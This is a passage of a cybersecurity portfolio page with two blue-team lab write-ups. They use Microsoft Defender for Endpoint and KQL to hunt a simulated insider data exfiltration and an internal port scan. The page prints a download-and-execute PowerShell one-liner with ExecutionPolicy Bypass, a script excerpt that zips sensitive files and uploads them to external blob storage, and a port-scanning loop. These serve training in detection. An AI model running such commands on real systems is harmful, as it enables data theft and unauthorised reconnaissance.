Through disciplined analysis and structured response, this project reinforced the value of proactive threat-hunting practices using Microsoft Defender for Endpoint.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)
1b:T290f,
## Introduction

This threat-hunting exercise focused on investigating a suspected case of data exfiltration within a simulated enterprise environment. The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.

The purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.

My lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.

## Scenario Overview

The investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.

John's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.

The objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.

## Preparation

Before the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.

- Created VM and onboarded to Microsoft Defender for Endpoint
- RDP connection established to VM
- Downloaded and ran MDE onboarding package
- VM successfully reporting in Defender portal

### PowerShell Command

-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
-------------------------------------------------------

This command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample "employee data," and simulated uploading them to an external Azure storage bucket.

In an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.

## Data Collection

With the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:

- DeviceFileEvents
- DeviceProcessEvents
- DeviceNetworkEvents

I ran an initial query to confirm that new records were appearing in real time.

### KQL Check for Recent Logs

-------------------------------------------------------
kql
DeviceFileEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.

## Data Analysis

The next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.

### KQL â Detect Archive Process Activity

-------------------------------------------------------
kql
let archive_applications = dynamic(["winrar.exe","7z.exe","winzip32.exe","peazip.exe","Bandizip.exe","UniExtract.exe","POWERARC.EXE","IZArc.exe","AshampooZIP.exe","FreeArc.exe"]);
let VMName = "samson-windows-";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
-------------------------------------------------------

Within seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\ProgramData\Backup\, suggesting automation.

Each entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.

## Investigation

To understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.

### KQL â Correlate File and Process Activity

-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-14T18:42:10.5615171Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

This query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.

Upon reviewing the VM's filesystem, I located the script at C:\ProgramData\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.

<InlineGallery images={data-exfiltration-detection-analysis} title="Data Exfiltration Detection and Analysis Process" />

### Snippet of the Observed PowerShell Script

Simplified excerpt of ExfiltrateData.ps1

-------------------------------------------------------
powershell
Start-Process "7z.exe" -ArgumentList "a", "C:\ProgramData\Backup\employee_data.zip", "C:\SensitiveFiles*"
Invoke-WebRequest -Uri "https://storageaccount.blob.core.windows.net/container/employee_data.zip" -Method Put -InFile "C:\ProgramData\Backup\employee_data.zip"
-------------------------------------------------------

The script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred. While no explicit network event confirmed the upload due to logging limitations, the sequence strongly suggested an attempted data transfer.

## Response and MITRE ATT&CK Mapping

This activity mapped directly to several tactics within the MITRE ATT&CK Framework:

1. **T1059.001 â PowerShell (Execution)**: PowerShell was used to install and execute the archiving utility.
2. **T1560 â Archive Collected Data (Collection)**: 7-Zip was used to compress sensitive data.
3. **T1074 â Data Staged (Collection)**: Archives were staged locally in C:\ProgramData\Backup\.
4. **T1048 â Exfiltration Over Alternative Protocol (Exfiltration)**: The script attempted HTTP PUT operations to Azure Blob storage.
5. **T1082 â System Information Discovery (Discovery)**: System metadata was queried before execution.

Upon discovering the activity, I isolated samson-windows- using Defender for Endpoint's "Isolate Device" feature to prevent further data loss. A subsequent malware scan returned no persistent threats; however, standard protocol would dictate re-imaging the endpoint for assurance.

## Documentation

Every step of this hunt should meticulously be documented from initial hypothesis through evidence gathering and correlation. All queries, findings, timestamps, and reasoning should be logged to ensure transparency and repeatability.

This approach mirrors a real-world SOC investigation, where maintaining a chronological record of queries and findings is crucial for post-incident reviews and audits. It also supports organizational learning by building an internal knowledge repository for future hunts.

## Improvement

Following the investigation, several security improvements were identified for the environment:

1. **Restrict PowerShell Execution Policies**: Limit execution to signed scripts only.
2. **Apply Data Loss Prevention (DLP) Controls**: Block unauthorized archive creation and outbound uploads.
3. **Enable Network Segmentation**: Prevent free east-west traffic between workstations.
4. **Implement Insider Threat Monitoring**: Establish alerts for mass file compressions or rapid archiving.
5. **Automate Detection Rules**: Create custom Defender queries to alert when users modify more than N ZIP files within a defined interval.

Together, these recommendations would help detect and contain future insider threat attempts before data is lost.

## Conclusion

This scenario successfully demonstrated how a disgruntled employee with admin rights could use simple PowerShell automation and compression tools to exfiltrate data without triggering traditional antivirus alerts.

Through structured querying in Microsoft Defender for Endpoint and methodical log analysis, I was able to trace the entire activity chain, from script execution to archiving and simulated upload attempts.

This exercise reinforced the importance of monitoring for non-malware abuse of legitimate tools and the necessity of tight endpoint controls to detect and deter insider threats in modern enterprise networks.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)
1c:T3430,
## Introduction

This threat hunting exercise was focused on investigating a sudden and unexplained network slowdown observed within a simulated enterprise lab environment. Using Microsoft Defender for Endpoint (MDE), the purpose of this hunt was to determine whether the performance degradation was caused by malicious internal activity, excessive resource usage, or misconfigured systems.

The environment consisted of my onboarded virtual machine named samson-windows-1, which was actively reporting telemetry to Microsoft Defender for Endpoint. The goal was to use real-time logs and threat hunting queries to identify abnormal behaviors that could suggest internal reconnaissance, port scanning, or other unauthorized actions within the network.

This scenario demonstrates a practical application of endpoint detection and response (EDR) data in uncovering internal security issues and applying structured analysis techniques to isolate potential causes.

## Scenario Overview

The issue began when the server team observed an overall slowdown across multiple legacy devices in the 10.0.0.0/16 subnet. External DDoS attacks were ruled out, meaning the cause was likely internal. The unrestricted internal network environment, where all hosts could communicate freely and PowerShell was allowed without restriction, created a perfect scenario for internal misuse or exploitation.

The working hypothesis for this hunt was that one of the systems inside the local network could have been performing unauthorized port scanning or large data transfers, which would naturally create latency or bandwidth congestion. The objective was to identify the specific device responsible for this unusual activity and determine whether it was a deliberate or automated action.

## Preparation

Before starting the hunt, I ensured that my virtual machine, samson-windows-, was properly onboarded to Microsoft Defender for Endpoint. Once confirmed, I simulated an internal event by executing a PowerShell command designed to initiate a controlled port scan within the local subnet. This step was necessary to generate realistic logs for analysis, mimicking what a real-world internal threat might look like.

<InlineGallery images={vm-setup-onboarding} title="VM Setup and Microsoft Defender Onboarding Process" />

### PowerShell Command
-------------------------------------------------------
powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
-------------------------------------------------------

This PowerShell command downloaded and executed a script that scanned a range of IPs within the 10.0.0.x subnet, sequentially probing ports on other devices. In a real enterprise setting, this would represent a potential reconnaissance operation, something commonly done by attackers or misconfigured tools trying to map network exposure.

After executing the command, I allowed several minutes for the resulting logs to populate in Microsoft Defender for Endpoint's hunting tables. The preparation phase was crucial, as it ensured that the system had generated enough telemetry to analyze behaviors such as failed connection attempts, sequential port scanning, and process execution traces.

## Data Collection

Once the environment was prepared, the next phase involved verifying that telemetry data was actively being received across the three key Defender tables: DeviceNetworkEvents, DeviceFileEvents, and DeviceProcessEvents.

I began by executing a simple query to confirm that new logs were flowing in correctly. By ordering results by timestamp and taking the most recent entries, I could confirm that MDE was actively collecting data and that there were no ingestion delays.

### KQL Check for Recent Network Logs
-------------------------------------------------------
kql
DeviceNetworkEvents
| order by Timestamp desc
| take 10
-------------------------------------------------------

The timestamps confirmed that logs were being generated in real time. Having verified the data sources, I was confident that the environment was providing the necessary visibility to conduct meaningful analysis.

In a real security operations environment, this phase mimics ensuring that sensors and logging mechanisms are functioning correctly before an investigation begins. Without fresh telemetry, an analyst could end up drawing conclusions from outdated or incomplete information.

## Data Analysis

The analysis phase began with looking for signs of network anomalies, specifically focusing on connection attempts that had either failed or succeeded in large quantities. A sudden burst of such activity could be indicative of scanning or enumeration attempts within the network.

### KQL â Count Failed Connections
-------------------------------------------------------
kql
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP
| order by FailedConnectionsAttempts desc
-------------------------------------------------------

When the results came back, the data immediately pointed to samson-windows- as the primary contributor to abnormal connection failures. The logs revealed that the device had failed over a hundred connection attempts, some directed at its own IP address and others toward another host in the subnet. Such behavior was a strong indicator of either misconfiguration or automated probing.

To further understand the scope of the activity, I drilled down into specific IP addresses that exhibited the highest failure rates. This approach mirrors a real-world scenario where analysts pivot from a general pattern to a specific anomaly for deeper inspection.

### KQL â Inspect All Failed Connections from a Specific IP
-------------------------------------------------------
kql
let IPInQuestion = "10.0.0.5";
DeviceNetworkEvents
| where ActionType == "ConnectionFailed"
| where LocalIP == IPInQuestion
| order by Timestamp desc
-------------------------------------------------------

Upon reviewing the sequence of failed connection attempts, it became clear that the remote ports being contacted followed a sequential pattern: ports 21, 23, 25, 53, 80, 110, 443, and others. This pattern matched the signature of a port scanning activity, which is typically used to identify open services running across hosts. Sequential probing of well-known ports is rarely accidental and often indicates reconnaissance or mapping behavior within the network.

At this stage, I had high confidence that the slowdown was caused by internal scanning originating from the samson-windows- VM.

<InlineGallery images={network-investigation-analysis} title="Network Investigation and Analysis Process" />

## Investigation

To confirm the origin of this suspicious activity, I pivoted to the DeviceProcessEvents table to look for the process responsible for initiating these connections. By focusing on a specific time window surrounding the detected network anomalies, I aimed to identify any executable or script that matched the port scanning behavior.

### KQL â Correlate Process Activity around the Port Scan Time
-------------------------------------------------------
kql
let VMName = "samson-windows-";
let specificTime = datetime(2025-10-12T13:15:03.9576325Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine
-------------------------------------------------------

The query output revealed that a PowerShell script named portscan.ps1 had been executed under the System account. This was a significant finding because the System account generally has administrative-level privileges and is not typically used to execute network scanning scripts.

Upon logging into the VM, I located the file in C:\ProgramData\portscan.ps1 and reviewed its contents. The script was intentionally scanning hosts in the subnet, sequentially testing common ports. This confirmed that the slowdown was caused by repeated internal scanning initiated by the PowerShell script.

### Snippet of the observed PowerShell script:
-------------------------------------------------------
powershell
for ($i=4; $i -le 10; $i++) {
   Test-NetConnection "10.0.0.$i" -Port 21,23,25,53,80,110,443
}
-------------------------------------------------------

Since the script was running under the System account and not triggered by an identifiable user, I concluded that the activity was automated and potentially malicious. I proceeded to isolate the samson-windows- VM from the network using Defender for Endpoint's built-in Isolate Device feature.

After isolating the system, I ran a full malware scan to check for persistence mechanisms or additional payloads. The scan returned clean, but ideally you are to request a full rebuild of the VM. In a production setting, this step ensures that any potential hidden or dormant artifacts are fully removed.

<InlineGallery images={port-scan-investigation-isolation} title="Port Scan Investigation and Device Isolation Process" />

## Response and MITRE ATT&CK Mapping

This scenario corresponded with several techniques in the MITRE ATT&CK Framework, helping align the observed activity with recognized adversarial tactics:

1. **Reconnaissance (T1046 â Network Service Scanning)**: The port scanning activity represented a clear attempt to enumerate open services.
2. **Execution (T1059.001 â PowerShell)**: The PowerShell script was used as the execution medium for network probing.
3. **Privilege Escalation (T1078 â Valid Accounts / System Context)**: The script ran under the System account, suggesting a high privilege level.
4. **Lateral Movement (T1021 â Remote Services)**: The scanning pattern indicated attempts to discover reachable hosts for potential lateral movement.

By isolating the device, scanning for malware, and scheduling a reimage, the risk of any further impact was neutralized.

## Documentation

Throughout the course of this investigation, I documented every major step and observation to ensure a clear understanding of how the event unfolded. The investigation began with an initial hypothesis of possible internal misuse, which evolved into the discovery of systematic port scanning. Each query used in Defender for Endpoint was recorded alongside its findings to form an evidence trail.

This documentation not only captured the technical steps taken, such as verifying logs, pivoting between tables, and confirming the script execution but also reflected the reasoning behind each action. Maintaining detailed documentation like this allows for transparency, consistency, and reproducibility in future hunts. It also helps build reference material that can be used by other analysts for similar incidents, ensuring the organization's knowledge base grows with every investigation.

## Improvement

After analyzing the entire scenario, several improvement points were identified. First, it became clear that PowerShell execution policies were too relaxed in this environment. Restricting PowerShell to only run signed scripts would immediately reduce the risk of arbitrary script execution.

Second, the internal network lacked segmentation, allowing one compromised host to communicate freely with all others. In a real corporate setup, proper network segmentation would ensure that unnecessary east-west traffic is limited and monitored.

Third, implementing automated alerting for abnormal internal traffic patterns, such as repeated connection failures to sequential ports, would enable the SOC team to detect similar behavior earlier. Additionally, conducting proactive threat hunts on a routine basis helps catch reconnaissance activities before they evolve into actual compromise events.

Ultimately, this scenario reinforced the importance of combining technical detection with procedural discipline, ensuring every hunt improves the overall security posture of the environment.

## Conclusion

The sudden network slowdown was traced to a PowerShell-based port scanning script executed under the System account on samson-windows-. Although no active compromise was found, the activity realistically simulated how internal reconnaissance could degrade performance and increase exposure within an unrestricted network.

This hunt demonstrated the power of Microsoft Defender for Endpoint in identifying behavioral anomalies, correlating telemetry across different data sources, and facilitating immediate containment actions.

Through structured investigation and methodical documentation, this exercise emphasized how internal misconfigurations or unauthorized automation can lead to observable network symptoms, and how disciplined threat hunting can quickly uncover their root cause.

## Important Link

If you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)

9:["$","$L12",null,{"projectData":{"slug":"30-day-soc-analyst-challenge-part27","title":"Part 27: Investigating an RDP Brute Force Attack","description":"Day 27 of the 30-Day MYDFIR SOC Analyst Challenge: Analyzing and investigating RDP brute force attacks using security tools and automated ticketing.","date":"2024-11-27","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["RDP","Brute Force","SOC","Security","Investigation"],"content":"$13","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/30-days-day-27.png","alt":"30 Days MYDFIR SOC Analyst Challenge Day 27"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":27,"totalParts":30}},"relatedProjects":[{"slug":"30-day-soc-analyst-challenge-part26","title":"Part 26: Investigating an SSH Brute Force Alert","description":"Day 26 of the 30-Day MYDFIR SOC Analyst Challenge: Analyzing and investigating SSH brute force attacks using security tools and threat intelligence.","date":"2024-11-26","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["SSH","Brute Force","SOC","Security","Investigation"],"content":"$14","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/30-days-day-26.png","alt":"30 Days MYDFIR SOC Analyst Challenge Day 26"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":26,"totalParts":30}},{"slug":"30-day-soc-analyst-challenge-part28","title":"Part 28: Investigating the Mythic C2 Framework","description":"Day 28 of the 30-Day MYDFIR SOC Analyst Challenge: Analyzing and investigating Command and Control (C2) framework activities using network telemetry and process logs.","date":"2024-11-28","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["C2","Mythic","SOC","Security","Investigation"],"content":"$15","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/30-days-day-28.png","alt":"30 Days MYDFIR SOC Analyst Challenge Day 28"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":28,"totalParts":30}},{"slug":"30-day-soc-analyst-challenge-part21","title":"Part 21: Brute Force Attack & Establishing a C2 Session","description":"Day 21 of the 30-Day MYDFIR SOC Analyst Challenge: Executing a brute force attack, generating a Mythic agent, and establishing a Command and Control session on a Windows Server.","date":"2024-11-21","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Brute Force","C2","SOC","Security","Windows Security"],"content":"$16","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/1-30-days-day-21.png","alt":"30 Days MYDFIR SOC Analyst Challenge Day 21"},{"src":"/images/projects/30-day-challenge/2-Screenshot.png","alt":"Initial Screenshot"},{"src":"/images/projects/30-day-challenge/3-rdp-windows-server-on-parrot.png","alt":"RDP Connection to Windows Server from Parrot"},{"src":"/images/projects/30-day-challenge/4-running-command-on-windows-server.png","alt":"Running Commands on Windows Server"},{"src":"/images/projects/30-day-challenge/5-turning-off-windows-defender-on-windows-server.png","alt":"Disabling Windows Defender"},{"src":"/images/projects/30-day-challenge/6-established-connection.png","alt":"Established Connection"},{"src":"/images/projects/30-day-challenge/7-mythic-dashboard-apollo-install.png","alt":"Mythic Dashboard Apollo Installation"},{"src":"/images/projects/30-day-challenge/8-C2-install-on-Mythic.png","alt":"C2 Installation on Mythic"},{"src":"/images/projects/30-day-challenge/9-command-and-control-stage.png","alt":"Command and Control Stage"},{"src":"/images/projects/30-day-challenge/10-exfiltration.png","alt":"Data Exfiltration"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":21,"totalParts":30}}],"oldestProjects":[{"slug":"30-day-mydfir-soc-analyst-challenge-part0","title":"Introduction to the MYDFIR SOC Analyst Challenge","description":"An introduction to the comprehensive 30-day challenge for aspiring SOC analysts.","date":"2024-10-31","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Blue Team","SOC","Security Monitoring","Training"],"content":"$17","image":"/images/projects/Mydfir 30 day challenge.png","technologies":["ELK Stack","SIEM","Security Tools","Monitoring"],"images":[{"src":"/images/projects/30-day-challenge/30Days-MYDFIR-Challenge.png","alt":"30 Days MYDFIR SOC Analyst Challenge Overview"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":0,"totalParts":30}},{"slug":"30-day-soc-analyst-challenge-part1","title":"Part 1: Foundation, A Logical Network Diagram","description":"Learn how to create a comprehensive logical network diagram for your SOC environment, establishing the foundation for my 30-day security monitoring journey.","date":"2024-11-01","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Network Diagram","SOC","Architecture","Documentation"],"content":"$18","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/1-30Days-MYDFIR-Day-1.png","alt":"30 Days MYDFIR Challenge Day 1"},{"src":"/images/projects/30-day-challenge/2-Day-1-work-with-draw-io.png","alt":"Working with Draw.io on Day 1"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":1,"totalParts":30}},{"slug":"30-day-soc-analyst-challenge-part2","title":"Part 2: Diving into the ELK Stack","description":"Explore the powerful ELK stackâElasticsearch, Logstash, and Kibanaâand understand their crucial roles in security operations and log management.","date":"2024-11-02","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["ELK Stack","Elasticsearch","Logstash","Kibana","Log Management"],"content":"$19","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/Day-2-mydfir-soc-analyst-challenge.png","alt":"Day 2 MYDFIR SOC Analyst Challenge"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":2,"totalParts":30}}],"newestProjects":[{"slug":"project-5-4-log-n-pacific-internship-threat-hunting-scenario4","title":"Project 5.4: LOG(N) Pacific Internship: Threat Hunting Scenario 4: PwnCrypt Ransomware Outbreak","description":"A comprehensive threat hunting exercise investigating a PwnCrypt ransomware outbreak, using Microsoft Defender for Endpoint to analyze file encryption activities, process execution chains, and ransomware indicators of compromise.","date":"2025-10-24","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Ransomware Analysis","Incident Response","EDR","KQL","PowerShell"],"content":"$1a","image":"/images/projects/Zero-day-red.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.4: LOG(N) Pacific Internship: Threat Hunting Scenario 4: PwnCrypt Ransomware Outbreak","order":4}},{"slug":"project-5-3-log-n-pacific-internship-threat-hunting-scenario3","title":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","description":"A comprehensive threat hunting exercise investigating suspected data exfiltration by a disgruntled employee, using Microsoft Defender for Endpoint to identify unauthorized archiving and data transfer activities within the network.","date":"2025-10-20","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Data Exfiltration","Insider Threat","EDR","KQL","PowerShell"],"content":"$1b","image":"/images/projects/Suspected Data Exfiltration.jpeg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","order":3}},{"slug":"project-5-2-log-n-pacific-internship-threat-hunting-scenario2","title":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","description":"A comprehensive threat hunting exercise investigating sudden network performance degradation caused by internal port scanning activity, using Microsoft Defender for Endpoint to identify unauthorized reconnaissance within the network.","date":"2025-10-14","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Network Security","Port Scanning","EDR","KQL","PowerShell"],"content":"$1c","image":"/images/projects/Windows Defender Fir..._imresizer.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","order":2}}],"categoryCounts":{"All":50,"Blue Team":44,"Red Team":2,"Infrastructure":3,"Cloud":1}}]
e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
b:null
c:null
10:[["$","title","0",{"children":"Samson's | Cybersecurity Portfolio"}],["$","meta","1",{"name":"description","content":"Professional cybersecurity portfolio showcasing expertise in digital security"}],["$","meta","2",{"name":"generator","content":"v0.dev"}],["$","link","3",{"rel":"icon","href":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png"}]]
